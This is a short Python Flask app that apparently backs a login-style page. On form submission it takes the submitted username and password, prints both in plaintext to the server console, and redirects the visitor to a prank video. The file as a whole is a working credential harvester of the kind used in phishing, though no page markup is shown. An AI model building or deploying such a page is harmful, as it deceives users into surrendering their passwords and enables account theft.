from flask import Flask, render_template, request, redirect

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == "GET":
        return render_template('index.html')
    if request.method == "POST":
        username = request.form.get('username')
        password = request.form.get('password')
        print(f"Username: {username}\nPassword: {password}")
        return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ", 302)


if __name__ == '__main__':
    app.run()
